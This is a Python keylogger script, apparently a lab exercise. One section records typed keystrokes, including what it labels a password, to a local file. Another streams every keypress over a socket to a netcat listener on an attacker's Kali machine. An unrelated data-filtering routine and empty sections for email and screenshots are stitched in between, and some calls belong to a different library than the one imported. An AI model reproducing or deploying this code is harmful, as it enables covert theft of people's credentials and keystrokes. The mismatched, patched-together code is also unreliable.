# ===================================================== Basic keylogger ================================================

import keyboard

# Defining the text file name and path
path = "keysniffer_data.txt"

while True:
    with open(path, "a") as data_file:

        # All key presses are recorded as a list into "events"
        # and the record loop stops when the "enter" key is pressed
        events = keyboard.record("enter")
        password = list(keyboard.get_typed_strings(events))

        data_file.write("\n")  # New line written before data is written
        data_file.write(password[0])


# ===================================================== Filtering data =======================================================

import json
import os


def filter_data(data, criteria):
    return [item for item in data if all(item.get(k) == v for k, v in criteria.items())]


def read_data_from_file(file_path):
    if not os.path.exists(file_path):
        raise FileNotFoundError(f"File {file_path} not found.")
    with open(file_path, "r") as file:
        return [json.loads(line) for line in file]


def save_data_to_file(data, file_path):
    with open(file_path, "w") as file:
        file.writelines(json.dumps(item) + "\n" for item in data)


# Paths
data_file_path = "data.txt"
output_file_path = "filtered_results.txt"

# Filter and save
example_data = read_data_from_file(data_file_path)
criteria = {"age": 30, "city": "New York"}
filtered_results = filter_data(example_data, criteria)
save_data_to_file(filtered_results, output_file_path)

print(f"Filtered results saved to {output_file_path}")

# ===================================================== Sending by email =========================================================


# ===================================================== Taking screenshots =======================================================


# ===================================================== Typing live ==============================================================

import socket

# Netcat server details
nc_host = "10.0.2.15"  # Replace with your netcat listener IP
nc_port = 4444  # Replace with your netcat listener port


def send_key_to_netcat(key):
    try:
        # It opens a network socket using socket.socket() to communicate with the Netcat server and tries to connect using the server information
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((nc_host, nc_port))

            # If the key has a printable character (key.char exists), it is encoded and sent to the server (normal keys)
            if hasattr(key, "char") and key.char:
                s.sendall(key.char.encode())

            # If the key is a space (keyboard.Key.space), a space character is sent (space)
            elif key == keyboard.Key.space:
                s.sendall(b" ")

            # If the key is a special key (e.g., Shift, Ctrl), its name (e.g., [Key.shift]) is sent. (special keys)
            else:
                s.sendall(f" [{key}] ".encode())

    # If there’s any issue (e.g., the server is unreachable), it prints an error message.
    except Exception as e:
        print(f"Error: {e}")


# Callback function for key press --> each time a key is pressed it will send it to netcat in the kali linux machine
def on_press(key):
    send_key_to_netcat(key)


print("Keylogger is running... Press Ctrl+C to stop.")

# Start the listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
